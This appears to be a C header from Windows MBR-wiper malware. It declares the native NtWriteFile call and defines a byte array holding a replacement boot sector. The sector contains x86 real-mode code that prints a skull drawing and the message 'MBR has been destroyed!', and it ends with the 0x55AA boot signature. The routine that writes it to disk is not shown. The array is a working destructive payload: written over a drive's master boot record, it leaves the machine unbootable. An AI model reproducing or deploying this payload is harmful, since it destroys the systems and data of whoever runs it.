#pragma once
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>

#pragma comment(lib, "ntdll.lib")

NTSTATUS NTAPI NtWriteFile(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key);

BYTE buffer[] = { 
    0xB4, 0x06, 0xB7, 0x04, 0x32, 0xC0, 0x33, 0xC9, 0xBA, 0x4F, 0x18, 0xCD,
    0x10, 0xBE, 0x1C, 0x7C, 0xAC, 0x84, 0xC0, 0x74, 0x06, 0xB4, 0x0E, 0xCD,
    0x10, 0xEB, 0xF5, 0xF4, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x75, 0x75, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x75, 0x75, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x75, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x75, 0x75, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20,
    0x20, 0x20, 0x20, 0x75, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x75, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x75, 0x55,
    0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x75, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x75, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x75, 0x20, 0x20,
    0x0D, 0x0A, 0x20, 0x20, 0x75, 0x55, 0x55, 0x55, 0x55, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x55, 0x55, 0x55, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x55, 0x55, 0x55, 0x55, 0x75, 0x20, 0x20, 0x0D, 0x0A, 0x20,
    0x20, 0x20, 0x55, 0x55, 0x55, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x75, 0x55, 0x75, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x55, 0x55, 0x55, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x55,
    0x55, 0x55, 0x75, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x55, 0x55,
    0x55, 0x75, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x55, 0x55, 0x55, 0x20,
    0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x55, 0x55, 0x55, 0x55,
    0x75, 0x75, 0x55, 0x55, 0x55, 0x20, 0x20, 0x20, 0x20, 0x20, 0x55, 0x55,
    0x55, 0x75, 0x75, 0x55, 0x55, 0x55, 0x55, 0x20, 0x20, 0x20, 0x20, 0x0D,
    0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x55, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x75, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x75, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75, 0x55, 0x55, 0x55, 0x55,
    0x55, 0x55, 0x55, 0x75, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x20, 0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x20, 0x55, 0x55, 0x55, 0x55, 0x55, 0x75, 0x55, 0x75, 0x55, 0x75,
    0x55, 0x55, 0x55, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
    0x20, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x20, 0x20,
    0x0D, 0x0A, 0x0D, 0x0A, 0x4D, 0x42, 0x52, 0x20, 0x68, 0x61, 0x73, 0x20,
    0x62, 0x65, 0x65, 0x6E, 0x20, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F, 0x79,
    0x65, 0x64, 0x21, 0x0D, 0x0A, 0x00, 0x55, 0xAA };